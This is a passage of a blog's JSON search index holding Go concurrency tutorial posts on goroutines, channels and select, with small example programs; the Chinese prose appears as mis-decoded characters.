Œ/è¶…æ—¶æœºåˆ¶","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/%E8%B6%85%E6%97%B6%E6%9C%BA%E5%88%B6/"}]},{"title":"Goå¹¶å‘ç¼–ç¨‹â€”â€”select","date":"2023-10-27T01:24:02.178Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/å¹¶å‘ä¸å¹¶è¡Œ/select/ã€Goå¹¶å‘ç¼–ç¨‹ã€‘README/","text":"select ç”¨äºå¤„ç†å¼‚æ­¥ IO é—®é¢˜ï¼Œå®ƒçš„è¯­æ³•ä¸ switch éå¸¸ç±»ä¼¼ã€‚ç”± select å¼€å§‹ä¸€ä¸ªæ–°çš„é€‰æ‹©å—ï¼Œæ¯ä¸ªé€‰æ‹©æ¡ä»¶ç”± case è¯­å¥æ¥æè¿°ï¼Œå¹¶ä¸”æ¯ä¸ª case è¯­å¥é‡Œå¿…é¡»æ˜¯ä¸€ä¸ª channel æ“ä½œã€‚å®ƒæ—¢å¯ä»¥ç”¨äº channel çš„æ•°æ®æ¥æ”¶ï¼Œä¹Ÿå¯ä»¥ç”¨äº channel çš„æ•°æ®å‘é€ã€‚å¦‚æœ select çš„å¤šä¸ªåˆ†æ”¯éƒ½æ»¡è¶³æ¡ä»¶ï¼Œåˆ™ä¼šéšæœºçš„é€‰å–å…¶ä¸­ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„åˆ†æ”¯ã€‚ æ–°å»ºæºæ–‡ä»¶ channel.goï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç ï¼š 1234567891011121314151617181920212223package mainimport &quot;time&quot;import &quot;fmt&quot;func main() &#123; c1 := make(chan string) c2 := make(chan string) go func() &#123; time.Sleep(time.Second * 1) c1 &lt;- &quot;one&quot; &#125;() go func() &#123; time.Sleep(time.Second * 2) c2 &lt;- &quot;two&quot; &#125;() for i := 0; i &lt; 2; i++ &#123; select &#123; case msg1 := &lt;-c1: fmt.Println(&quot;received&quot;, msg1) case msg2 := &lt;-c2: fmt.Println(&quot;received&quot;, msg2) &#125; &#125;&#125; ä»¥ä¸Šä»£ç å…ˆåˆå§‹åŒ–ä¸¤ä¸ª channel c1 å’Œ c2ï¼Œç„¶åå¼€å¯ä¸¤ä¸ª goroutine åˆ†åˆ«å¾€ c1 å’Œ c2 å†™å…¥æ•°æ®ï¼Œå†é€šè¿‡ select ç›‘å¬ä¸¤ä¸ª channelï¼Œä»ä¸­è¯»å–æ•°æ®å¹¶è¾“å‡ºã€‚ è¿è¡Œç»“æœå¦‚ä¸‹ï¼š 123$ go run channel.goreceived onereceived two","tags":[{"name":"Go","slug":"Go","permalink":"https://hodlyounger.github.io/tags/Go/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"å¹¶å‘ä¸å¹¶è¡Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/å¹¶å‘ä¸å¹¶è¡Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/"},{"name":"select","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/å¹¶å‘ä¸å¹¶è¡Œ/select","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/select/"}]},{"title":"Goå¹¶å‘ç¼–ç¨‹â€”â€”goroutine","date":"2023-10-27T01:24:02.169Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/å¹¶å‘ä¸å¹¶è¡Œ/goroutine/ã€Goå¹¶å‘ç¼–ç¨‹ã€‘Goå¹¶å‘ç¼–ç¨‹â€”â€”goroutine/","text":"goroutine æ˜¯ Go è¯­è¨€å¹¶è¡Œè®¾è®¡çš„æ ¸å¿ƒã€‚goroutine æ˜¯ä¸€ç§æ¯”çº¿ç¨‹æ›´è½»é‡çš„å®ç°ï¼Œåå‡ ä¸ª goroutine å¯èƒ½åœ¨åº•å±‚å°±æ˜¯å‡ ä¸ªçº¿ç¨‹ã€‚ ä¸åŒçš„æ˜¯ï¼ŒGolang åœ¨ runtimeã€ç³»ç»Ÿè°ƒç”¨ç­‰å¤šæ–¹é¢å¯¹ goroutine è°ƒåº¦è¿›è¡Œäº†å°è£…å’Œå¤„ç†ï¼Œå½“é‡åˆ°é•¿æ—¶é—´æ‰§è¡Œæˆ–è€…è¿›è¡Œç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œä¼šä¸»åŠ¨æŠŠå½“å‰ goroutine çš„ CPU (P) è½¬è®©å‡ºå»ï¼Œè®©å…¶ä»– goroutine èƒ½è¢«è°ƒåº¦å¹¶æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ Golang ä»è¯­è¨€å±‚é¢æ”¯æŒäº†åç¨‹ã€‚è¦ä½¿ç”¨ goroutine åªéœ€è¦ç®€å•çš„åœ¨éœ€è¦æ‰§è¡Œçš„å‡½æ•°å‰æ·»åŠ  go å…³é”®å­—å³å¯ã€‚å½“æ‰§è¡Œ goroutine æ—¶å€™ï¼ŒGo è¯­è¨€ç«‹å³è¿”å›ï¼Œæ¥ç€æ‰§è¡Œå‰©ä½™çš„ä»£ç ï¼Œgoroutine ä¸é˜»å¡ä¸»çº¿ç¨‹ã€‚ä¸‹é¢æˆ‘ä»¬é€šè¿‡ä¸€å°æ®µä»£ç æ¥è®²è§£ go çš„ä½¿ç”¨ï¼š 1234567//é¦–å…ˆæˆ‘ä»¬å…ˆå®ç°ä¸€ä¸ª Add()å‡½æ•°func Add(a, b int) &#123; c := a + b fmt.Println(c)&#125;go Add(1, 2) //ä½¿ç”¨goå…³é”®å­—è®©å‡½æ•°å¹¶å‘æ‰§è¡Œ Go çš„å¹¶å‘æ‰§è¡Œå°±æ˜¯è¿™ä¹ˆç®€å•ï¼Œå½“åœ¨ä¸€ä¸ªå‡½æ•°å‰åŠ ä¸Š go å…³é”®å­—ï¼Œè¯¥å‡½æ•°å°±ä¼šåœ¨ä¸€ä¸ªæ–°çš„ goroutine ä¸­å¹¶å‘æ‰§è¡Œï¼Œå½“è¯¥å‡½æ•°æ‰§è¡Œå®Œæ¯•æ—¶ï¼Œè¿™ä¸ªæ–°çš„ goroutine ä¹Ÿå°±ç»“æŸäº†ã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¯¥å‡½æ•°å…·æœ‰è¿”å›å€¼ï¼Œé‚£ä¹ˆè¿”å›å€¼ä¼šè¢«ä¸¢å¼ƒã€‚æ‰€ä»¥ä»€ä¹ˆæ—¶å€™ç”¨ go è¿˜éœ€è¦é…Œæƒ…è€ƒè™‘ã€‚ æ¥ç€æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªæ¡ˆä¾‹æ¥ä½“éªŒä¸€ä¸‹ Go çš„å¹¶å‘åˆ°åº•æ˜¯æ€ä¹ˆæ ·çš„ã€‚æ–°å»ºæºæ–‡ä»¶ goroutine.goï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç ï¼š 1234567891011121314package mainimport &quot;fmt&quot;func Add(a, b int) &#123; c := a + b fmt.Println(c)&#125;func main() &#123; for i := 0; i &lt; 10; i++ &#123; go Add(i, i) &#125;&#125; æ‰§è¡Œ goroutine.go æ–‡ä»¶ä¼šå‘ç°å±å¹•ä¸Šä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œä½†ç¨‹åºå¹¶ä¸ä¼šæŠ¥é”™ï¼Œè¿™æ˜¯ä»€ä¹ˆåŸå› å‘¢ï¼ŸåŸæ¥å½“ä¸»ç¨‹åºæ‰§è¡Œåˆ° for å¾ªç¯æ—¶å¯åŠ¨äº† 10 ä¸ª goroutineï¼Œç„¶åä¸»ç¨‹åºå°±é€€å‡ºäº†ï¼Œè€Œå¯åŠ¨çš„ 10 ä¸ª goroutine è¿˜æ²¡æ¥å¾—åŠæ‰§è¡Œ Add() å‡½æ•°ï¼Œæ‰€ä»¥ç¨‹åºä¸ä¼šæœ‰ä»»ä½•è¾“å‡ºã€‚ä¹Ÿå°±æ˜¯è¯´ä¸» goroutine å¹¶ä¸ä¼šç­‰å¾…å…¶ä»– goroutine æ‰§è¡Œç»“æŸã€‚é‚£ä¹ˆå¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼ŸGo è¯­è¨€æä¾›çš„ä¿¡é“ï¼ˆchannelï¼‰å°±æ˜¯ä¸“é—¨è§£å†³å¹¶å‘é€šä¿¡é—®é¢˜çš„ï¼Œä¸‹ä¸€èŠ‚æˆ‘ä»¬å°†è¯¦ç»†ä»‹ç»ã€‚","tags":[{"name":"Code/Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"},{"name":"Go","slug":"Go","permalink":"https://hodlyounger.github.io/tags/Go/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"æ‰‹å†Œ/Goç®€æ˜æ‰‹å†Œ","slug":"æ‰‹å†Œ-Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C-Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"å¹¶å‘ä¸å¹¶è¡Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/å¹¶å‘ä¸å¹¶è¡Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/"},{"name":"goroutine","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/å¹¶å‘ä¸å¹¶è¡Œ/goroutine","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/goroutine/"}]},{"title":"ã€Goç®€æ˜æ‰‹å†Œã€‘Goå¹¶å‘ç¼–ç¨‹â€”â€”channel","date":"2023-10-27T01:24:02.157Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/å¹¶å‘ä¸å¹¶è¡Œ/channel/ã€Goç®€æ˜æ‰‹å†Œã€‘Goå¹¶å‘ç¼–ç¨‹â€”â€”channel/","text":"channel æ˜¯goroutine ä¹‹é—´äº’ç›¸é€šè®¯çš„ä¸œè¥¿ã€‚ç±»ä¼¼æˆ‘ä»¬ Unix ä¸Šçš„ç®¡é“ï¼ˆå¯ä»¥åœ¨è¿›ç¨‹é—´ä¼ é€’æ¶ˆæ¯ï¼‰ï¼Œç”¨æ¥ goroutine ä¹‹é—´å‘æ¶ˆæ¯å’Œæ¥æ”¶æ¶ˆæ¯ã€‚å…¶å®ï¼Œå°±æ˜¯åœ¨åš goroutine ä¹‹é—´çš„å†…å­˜å…±äº«ã€‚channel æ˜¯ç±»å‹ç›¸å…³çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ª channel åªèƒ½ä¼ é€’ä¸€ç§ç±»å‹çš„å€¼ï¼Œè¿™ä¸ªç±»å‹éœ€è¦åœ¨ channel å£°æ˜æ—¶æŒ‡å®šã€‚ å£°æ˜ä¸åˆå§‹åŒ– channel çš„ä¸€èˆ¬å£°æ˜å½¢å¼ï¼švar chanName chan ElementTypeã€‚ ä¸æ™®é€šå˜é‡çš„å£°æ˜ä¸åŒçš„æ˜¯åœ¨ç±»å‹å‰é¢åŠ äº† channel å…³é”®å­—ï¼ŒElementType åˆ™æŒ‡å®šäº†è¿™ä¸ª channel æ‰€èƒ½ä¼ é€’çš„å…ƒç´ ç±»å‹ã€‚ç¤ºä¾‹ï¼š 123var a chan int //å£°æ˜ä¸€ä¸ªä¼ é€’å…ƒç´ ç±»å‹ä¸ºintçš„channelvar b chan float64var c chan string åˆå§‹åŒ–ä¸€ä¸ª channel ä¹Ÿéå¸¸ç®€å•ï¼Œç›´æ¥ä½¿ç”¨ Go è¯­è¨€å†…ç½®çš„ make() å‡½æ•°ï¼Œç¤ºä¾‹ï¼š 123a := make(chan int) //åˆå§‹åŒ–ä¸€ä¸ªintå‹çš„åä¸ºaçš„channelb := make(chan float64)c := make(chan string) channel æœ€é¢‘ç¹çš„æ“ä½œå°±æ˜¯å†™å…¥å’Œè¯»å–ï¼Œè¿™ä¸¤ä¸ªæ“ä½œä¹Ÿéå¸¸ç®€å•ï¼Œç¤ºä¾‹ï¼š 123a := make(chan int)a &lt;- 1 //å°†æ•°æ®å†™å…¥channelz := &lt;-a //ä»channelä¸­è¯»å–æ•°æ®","tags":[{"name":"Code/Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"},{"name":"Go","slug":"Go","permalink":"https://hodlyounger.github.io/tags/Go/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"æ‰‹å†Œ/Goç®€æ˜æ‰‹å†Œ","slug":"æ‰‹å†Œ-Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C-Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"å¹¶å‘ä¸å¹¶è¡Œ","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/å¹¶å‘ä¸å¹¶è¡Œ","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/"},{"name":"channel","slug":"B-Code/GO/Goç®€æ˜æ‰‹å†Œ/å¹¶å‘ä¸å¹¶è¡Œ/channel","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/channel/"}]},{"title":"ã€Goç®€æ˜æ‰‹å†Œã€‘Goå¹¶å‘ç¼–ç¨‹","date":"2023-10-27T01:24:02.154Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/å¹¶å‘ä¸å¹¶è¡Œ/ã€Goç®€æ˜æ‰‹å†Œã€‘Goå¹¶å‘ç¼–ç¨‹/","text":"çŸ¥è¯†ç‚¹ å¹¶å‘ä¸å¹¶è¡Œ åç¨‹ goroutine channel select å¹¶å‘ç¼–ç¨‹ å¹¶å‘ä¸å¹¶è¡Œ å¹¶å‘æŒ‡åœ¨åŒä¸€æ—¶åˆ»åªèƒ½æœ‰ä¸€æ¡æŒ‡ä»¤æ‰§è¡Œï¼Œä½†å¤šä¸ªè¿›ç¨‹æŒ‡ä»¤è¢«å¿«é€Ÿçš„è½®æ¢æ‰§è¡Œï¼Œä½¿å¾—åœ¨å®è§‚ä¸Šå…·æœ‰å¤šä¸ªè¿›ç¨‹åŒæ—¶æ‰§è¡Œçš„æ•ˆæœï¼Œä½†åœ¨å¾®è§‚ä¸Šå¹¶ä¸æ˜¯åŒæ—¶æ‰§è¡Œçš„ï¼Œåªæ˜¯æŠŠæ—¶é—´åˆ†æˆè‹¥å¹²æ®µï¼Œé€šè¿‡ CPU æ—¶é—´ç‰‡è½®è½¬ä½¿å¤šä¸ªè¿›ç¨‹å¿«é€Ÿäº¤æ›¿çš„æ‰§è¡Œã€‚è€Œå¹¶è¡Œçš„å…³é”®æ˜¯ä½ æœ‰åŒæ—¶å¤„ç†å¤šä¸ªä»»åŠ¡çš„èƒ½åŠ›ã€‚å¹¶å‘å’Œå¹¶è¡Œéƒ½å¯ä»¥æ˜¯å¾ˆå¤šä¸ªçº¿ç¨‹ï¼Œå°±çœ‹è¿™äº›çº¿ç¨‹èƒ½ä¸èƒ½åŒæ—¶è¢«ï¼ˆå¤šä¸ªï¼‰CPU æ‰§è¡Œï¼Œå¦‚æœå¯ä»¥å°±è¯´æ˜æ˜¯å¹¶è¡Œï¼Œè€Œå¹¶å‘æ˜¯å¤šä¸ªçº¿ç¨‹è¢«ï¼ˆä¸€ä¸ªï¼‰CPU è½®æµåˆ‡æ¢ç€æ‰§è¡Œã€‚ä¸€ä¸ªç»å…¸ä¸”é€šä¿—æ˜“æ‡‚çš„ä¾‹å­è¿™æ ·è§£é‡Šå¹¶å‘ä¸å¹¶è¡Œçš„åŒºåˆ«ï¼šå¹¶å‘æ˜¯ä¸¤ä¸ªé˜Ÿåˆ—ï¼Œä½¿ç”¨ä¸€å°å’–å•¡æœºï¼›å¹¶è¡Œæ˜¯ä¸¤ä¸ªé˜Ÿåˆ—ï¼Œä½¿ç”¨ä¸¤å°å’–å•¡æœºã€‚å¦‚æœä¸²è¡Œï¼Œä¸€ä¸ªé˜Ÿåˆ—ä½¿ç”¨ä¸€å°å’–å•¡æœºï¼Œé‚£ä¹ˆå“ªæ€•å‰é¢é‚£ä¸ªäººæœ‰äº‹å‡ºå»äº†åŠå¤©ï¼Œåé¢çš„äººä¹Ÿåªèƒ½ç­‰ç€ä»–å›æ¥æ‰èƒ½å»æ¥å’–å•¡ï¼Œè¿™æ•ˆç‡æ— ç–‘æ˜¯æœ€ä½çš„ã€‚å›¾è§£ï¼š åç¨‹* åç¨‹ä¹Ÿå«è½»é‡çº§çº¿ç¨‹ã€‚ä¸ä¼ ç»Ÿçš„è¿›ç¨‹å’Œçº¿ç¨‹ç›¸æ¯”ï¼Œåç¨‹æœ€å¤§çš„ä¼˜ç‚¹å°±åœ¨äºå…¶è¶³å¤Ÿâ€œè½»â€ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥è½»æ¾åˆ›å»ºä¸Šç™¾ä¸‡ä¸ªåç¨‹è€Œä¸ä¼šå¯¼è‡´ç³»ç»Ÿèµ„æºæ¯ç«­ï¼Œè€Œçº¿ç¨‹å’Œè¿›ç¨‹é€šå¸¸æœ€å¤šä¸è¿‡è¿‘ä¸‡ä¸ªã€‚è€Œå¤šæ•°è¯­è¨€åœ¨è¯­æ³•å±‚é¢ä¸Šæ˜¯ä¸æ”¯æŒåç¨‹çš„ï¼Œä¸€èˆ¬éƒ½æ˜¯é€šè¿‡åº“çš„æ–¹å¼è¿›è¡Œæ”¯æŒï¼Œä½†åº“çš„æ”¯æŒæ–¹å¼å’ŒåŠŸèƒ½ä¸å¤Ÿå®Œå–„ï¼Œç»å¸¸ä¼šå¼•å‘é˜»å¡ç­‰ä¸€ç³»åˆ—é—®é¢˜ï¼Œè€Œ Go è¯­è¨€åœ¨è¯­æ³•å±‚é¢ä¸Šæ”¯æŒåç¨‹ï¼Œä¹Ÿå« goroutineã€‚è¿™è®©åç¨‹å˜å¾—éå¸¸ç®€å•ï¼Œè®©è½»é‡çº§çº¿ç¨‹çš„åˆ‡æ¢ç®¡ç†ä¸å†ä¾èµ–äºç³»ç»Ÿçš„è¿›ç¨‹å’Œçº¿ç¨‹ï¼Œä¹Ÿä¸ä¾èµ– CPU çš„æ•°é‡ã€‚ goroutine* goroutine æ˜¯ Go è¯­è¨€å¹¶è¡Œè®¾è®¡çš„æ ¸å¿ƒã€‚goroutine æ˜¯ä¸€ç§æ¯”çº¿ç¨‹æ›´è½»é‡çš„å®ç°ï¼Œåå‡ ä¸ª goroutine å¯èƒ½åœ¨åº•å±‚å°±æ˜¯å‡ ä¸ªçº¿ç¨‹ã€‚ ä¸åŒçš„æ˜¯ï¼ŒGolang åœ¨ runtimeã€ç³»ç»Ÿè°ƒç”¨ç­‰å¤šæ–¹é¢å¯¹ goroutine è°ƒåº¦è¿›è¡Œäº†å°è£…å’Œå¤„ç†ï¼Œå½“é‡åˆ°é•¿æ—¶é—´æ‰§è¡Œæˆ–è€…è¿›è¡Œç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œä¼šä¸»åŠ¨æŠŠå½“å‰ goroutine çš„ CPU (P) è½¬è®©å‡ºå»ï¼Œè®©å…¶ä»– goroutine èƒ½è¢«è°ƒåº¦å¹¶æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ Golang ä»è¯­è¨€å±‚é¢æ”¯æŒäº†åç¨‹ã€‚è¦ä½¿ç”¨ goroutine åªéœ€è¦ç®€å•çš„åœ¨éœ€è¦æ‰§è¡Œçš„å‡½æ•°å‰æ·»åŠ  go å…³é”®å­—å³å¯ã€‚å½“æ‰§è¡Œ goroutine æ—¶å€™ï¼ŒGo è¯­è¨€ç«‹å³è¿”å›ï¼Œæ¥ç€æ‰§è¡Œå‰©ä½™çš„ä»£ç ï¼Œgoroutine ä¸é˜»å¡ä¸»çº¿ç¨‹ã€‚ä¸‹é¢æˆ‘ä»¬é€šè¿‡ä¸€å°æ®µä»£ç æ¥è®²è§£ go çš„ä½¿ç”¨ï¼š 1234567//é¦–å…ˆæˆ‘ä»¬å…ˆå®ç°ä¸€ä¸ª Add()å‡½æ•°func Add(a, b int) &#123; c := a + b fmt.Println(c)&#125;go Add(1, 2) //ä½¿ç”¨goå…³é”®å­—è®©å‡½æ•°å¹¶å‘æ‰§è¡Œ Go çš„å¹¶å‘æ‰§è¡Œå°±æ˜¯è¿™ä¹ˆç®€å•ï¼Œå½“åœ¨ä¸€ä¸ªå‡½æ•°å‰åŠ ä¸Š go å…³é”®å­—ï¼Œè¯¥å‡½æ•°å°±ä¼šåœ¨ä¸€ä¸ªæ–°çš„ goroutine ä¸­å¹¶å‘æ‰§è¡Œï¼Œå½“è¯¥å‡½æ•°æ‰§è¡Œå®Œæ¯•æ—¶ï¼Œè¿™ä¸ªæ–°çš„ goroutine ä¹Ÿå°±ç»“æŸäº†ã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¯¥å‡½æ•°å…·æœ‰è¿”å›å€¼ï¼Œé‚£ä¹ˆè¿”å›å€¼ä¼šè¢«ä¸¢å¼ƒã€‚æ‰€ä»¥ä»€ä¹ˆæ—¶å€™ç”¨ go è¿˜éœ€è¦é…Œæƒ…è€ƒè™‘ã€‚ æ¥ç€æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªæ¡ˆä¾‹æ¥ä½“éªŒä¸€ä¸‹ Go çš„å¹¶å‘åˆ°åº•æ˜¯æ€ä¹ˆæ ·çš„ã€‚æ–°å»ºæºæ–‡ä»¶ goroutine.goï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç ï¼š 1234567891011121314package mainimport &quot;fmt&quot;func Add(a, b int) &#123; c := a + b fmt.Println(c)&#125;func main() &#123; for i := 0; i &lt; 10; i++ &#123; go Add(i, i) &#125;&#125; æ‰§è¡Œ goroutine.go æ–‡ä»¶ä¼šå‘ç°å±å¹•ä¸Šä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œä½†ç¨‹åºå¹¶ä¸ä¼šæŠ¥é”™ï¼Œè¿™æ˜¯ä»€ä¹ˆåŸå› å‘¢ï¼ŸåŸæ¥å½“ä¸»ç¨‹åºæ‰§è¡Œåˆ° for å¾ªç¯æ—¶å¯åŠ¨äº† 10 ä¸ª goroutineï¼Œç„¶åä¸»ç¨‹åºå°±é€€å‡ºäº†ï¼Œè€Œå¯åŠ¨çš„ 10 ä¸ª goroutine è¿˜æ²¡æ¥å¾—åŠæ‰§è¡Œ Add() å‡½æ•°ï¼Œæ‰€ä»¥ç¨‹åºä¸ä¼šæœ‰ä»»ä½•è¾“å‡ºã€‚ä¹Ÿå°±æ˜¯è¯´ä¸» goroutine å¹¶ä¸ä¼šç­‰å¾…å…¶ä»– goroutine æ‰§è¡Œç»“æŸã€‚é‚£ä¹ˆå¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼ŸGo è¯­è¨€æä¾›çš„ä¿¡é“ï¼ˆchannelï¼‰å°±æ˜¯ä¸“é—¨è§£å†³å¹¶å‘é€šä¿¡é—®é¢˜çš„ channel channel æ˜¯goroutine ä¹‹é—´äº’ç›¸é€šè®¯çš„ä¸œè¥¿ã€‚ç±»ä¼¼æˆ‘ä»¬ Unix ä¸Šçš„ç®¡é“ï¼ˆå¯ä»¥åœ¨è¿›ç¨‹é—´ä¼ é€’æ¶ˆæ¯ï¼‰ï¼Œç”¨æ¥ goroutine ä¹‹é—´å‘æ¶ˆæ¯å’Œæ¥æ”¶æ¶ˆæ¯ã€‚å…¶å®ï¼Œå°±æ˜¯åœ¨åš goroutine ä¹‹é—´çš„å†…å­˜å…±äº«ã€‚channel æ˜¯ç±»å‹ç›¸å…³çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ª channel åªèƒ½ä¼ é€’ä¸€ç§ç±»å‹çš„å€¼ï¼Œè¿™ä¸ªç±»å‹éœ€è¦åœ¨ channel å£°æ˜æ—¶æŒ‡å®šã€‚ å£°æ˜ä¸åˆå§‹åŒ– channel çš„ä¸€èˆ¬å£°æ˜å½¢å¼ï¼švar chanName chan ElementTypeã€‚ ä¸æ™®é€šå˜é‡çš„å£°æ˜ä¸åŒçš„æ˜¯åœ¨ç±»å‹å‰é¢åŠ äº† channel å…³é”®å­—ï¼ŒElementType åˆ™æŒ‡å®šäº†è¿™ä¸ª channel æ‰€èƒ½ä¼ é€’çš„å…ƒç´ ç±»å‹ã€‚ç¤ºä¾‹ï¼š 123var a chan int //å£°æ˜ä¸€ä¸ªä¼ é€’å…ƒç´ ç±»å‹ä¸ºintçš„channelvar b chan float64var c chan string åˆå§‹åŒ–ä¸€ä¸ª channel ä¹Ÿéå¸¸ç®€å•ï¼Œç›´æ¥ä½¿ç”¨ Go è¯­è¨€å†…ç½®çš„ make() å‡½æ•°ï¼Œç¤ºä¾‹ï¼š 123a := make(chan int) //åˆå§‹åŒ–ä¸€ä¸ªintå‹çš„åä¸ºaçš„channelb := make(chan float64)c := make(chan string) channel æœ€é¢‘ç¹çš„æ“ä½œå°±æ˜¯å†™å…¥å’Œè¯»å–ï¼Œè¿™ä¸¤ä¸ªæ“ä½œä¹Ÿéå¸¸ç®€å•ï¼Œç¤ºä¾‹ï¼š 123a := make(chan int)a &lt;- 1 //å°†æ•°æ®å†™å…¥channelz := &lt;-a //ä»channelä¸­è¯»å–æ•°æ® select select ç”¨äºå¤„ç†å¼‚æ­¥ IO é—®é¢˜ï¼Œå®ƒçš„è¯­æ³•ä¸ switch éå¸¸ç±»ä¼¼ã€‚ç”± select å¼€å§‹ä¸€ä¸ªæ–°çš„é€‰æ‹©å—ï¼Œæ¯ä¸ªé€‰æ‹©æ¡ä»¶ç”± case è¯­å¥æ¥æè¿°ï¼Œå¹¶ä¸”æ¯ä¸ª case è¯­å¥é‡Œå¿…é¡»æ˜¯ä¸€ä¸ª channel æ“ä½œã€‚å®ƒæ—¢å¯ä»¥ç”¨äº channel çš„æ•°æ®æ¥æ”¶ï¼Œä¹Ÿå¯ä»¥ç”¨äº channel çš„æ•°æ®å‘é€ã€‚å¦‚æœ select çš„å¤šä¸ªåˆ†æ”¯éƒ½æ»¡è¶³æ¡ä»¶ï¼Œåˆ™ä¼šéšæœºçš„é€‰å–å…¶ä¸­ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„åˆ†æ”¯ã€‚ æ–°å»ºæºæ–‡ä»¶ channel.goï¼Œè¾“å…¥ä»¥ä¸‹ä»£ç ï¼š 1234567891011121314151617181920212223package mainimport &quot;time&quot;import &quot;fmt&quot;func main() &#123; c1 := make(chan string) c2 := make(chan string) go func() &#123; time.Sleep(time.Second * 1) c1 &lt;- &quot;one&quot; &#125;() go func() &#123; time.Sleep(time.Second * 2) c2 &lt;- &quot;two&quot; &#125;() for i := 0; i &lt; 2; i++ &#123; select &#123; case msg1 := &lt;-c1: fmt.Println(&quot;received&quot;, msg1) case msg2 := &lt;-c2: fmt.Println(&quot;received&quot;, msg2) &#125; &#125;&#125; ä»¥ä¸Šä»£ç 